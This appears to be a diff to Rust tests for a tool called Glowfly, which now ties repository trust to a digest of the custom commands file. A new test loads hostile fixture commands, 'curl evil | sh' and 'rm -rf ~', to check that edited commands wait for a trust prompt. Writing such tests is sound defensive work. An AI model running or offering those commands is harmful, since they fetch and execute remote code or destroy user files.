@@ -9,7 +9,7 @@ use crate::effect::Effect;
 use crate::msg::{JobMsg, Msg, TrustMsg};
 use crate::state::{AppState, Modal, RunningJob, Selection};
 use glowfly_core::custom_commands::{FileRead, Source};
-use glowfly_core::settings::RepoTrust;
+use glowfly_core::trust::TrustPrint;
 use std::time::Instant;
 
 fn run(st: &mut AppState, source: Source, name: &str, at: Target) -> Vec<Effect> {
@@ -186,9 +186,10 @@ fn cancelling_the_trust_prompt_drops_the_command() {
     update(&mut st, Msg::CloseModal, Instant::now());
     assert!(st.modal.is_none() && st.job.is_none());
     assert!(last_log(&st).starts_with("Sh wasn't run."), "{}", last_log(&st));
-    // A repository trusted before runs them at once.
+    // A repository trusted before with this commands file runs them at once.
     let real = st.snap.as_ref().unwrap().real_workdir.clone();
-    crate::state::trust::record(&mut st.settings, &real, RepoTrust::Trusted);
+    let digest = st.custom_commands.repo_digest.clone().unwrap();
+    crate::state::trust::record_trusted(&mut st.settings, &real, TrustPrint::of_commands(&digest));
     assert!(matches!(run(&mut st, Source::Repo, "Sh", Target::Palette).as_slice(), [Effect::CustomCommand(_)]));
     let _ = std::fs::remove_dir_all(&dir);
 }
@@ -236,5 +237,43 @@ fn in_a_held_repository_every_command_waits() {
     assert!(confirm_body(&st).contains(".glowfly/commands.toml"), "{}", confirm_body(&st));
     assert!(update(&mut st, Msg::ConfirmAccepted, Instant::now()).is_empty());
     assert_eq!(held(&st), Some("Mine"));
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+#[test]
+fn a_commands_file_edited_outside_waits_for_trust_before_the_refresh_notices() {
+    let (mut st, dir) = opened("cc-run-edited");
+    let real = st.snap.as_ref().unwrap().real_workdir.clone();
+    let trusted = file(&command("Sh", "shell", "echo hi", ""));
+    let digest = trusted.digest.clone().unwrap();
+    crate::state::trust::record_trusted(&mut st.settings, &real, TrustPrint::of_commands(&digest));
+    load(&mut st, FileRead::default(), trusted);
+    assert!(matches!(run(&mut st, Source::Repo, "Sh", Target::Palette).as_slice(), [Effect::CustomCommand(_)]), "trusted as it is");
+    st.job = None;
+
+    // Edited outside Glowfly: the watcher's reload of the commands file lands before the
+    // repository's next full load, so the repository still reads as Trusted.
+    load(&mut st, FileRead::default(), file(&command("Sh", "shell", "curl evil | sh", "")));
+    assert_eq!(st.trust_standing(), Some(crate::state::trust::Standing::Trusted));
+    let fx = run(&mut st, Source::Repo, "Sh", Target::Palette);
+    assert!(fx.is_empty(), "nothing runs: {fx:?}");
+    assert!(st.job.is_none());
+    assert_eq!(held(&st), Some("Sh"), "it waits in the trust prompt");
+    let Some(Modal::Trust(p)) = &st.modal else { panic!("the trust prompt") };
+    assert!(p.gained.as_ref().is_some_and(|g| g.commands.is_some()), "listing the changed file");
+
+    // Trust and run runs it, and trusts that file from then on.
+    let fx = update(&mut st, Msg::Trust(TrustMsg::Decide { real: real.clone(), trusted: true }), Instant::now());
+    assert!(fx.iter().any(|e| matches!(e, Effect::CustomCommand(CustomCommandEffect::RunShell(_)))), "{fx:?}");
+    let saved = st.settings.saved_trust(&real).and_then(|t| t.print).unwrap();
+    assert!(saved.covers_commands(st.custom_commands.repo_digest.as_deref().unwrap()));
+    assert!(saved.covers_commands(&digest), "and still the earlier one");
+
+    // Cancel instead runs nothing.
+    st.job = None;
+    load(&mut st, FileRead::default(), file(&command("Sh", "shell", "rm -rf ~", "")));
+    assert!(run(&mut st, Source::Repo, "Sh", Target::Palette).is_empty());
+    update(&mut st, Msg::CloseModal, Instant::now());
+    assert!(st.job.is_none() && st.trust.held.is_none());
     let _ = std::fs::remove_dir_all(&dir);
 }
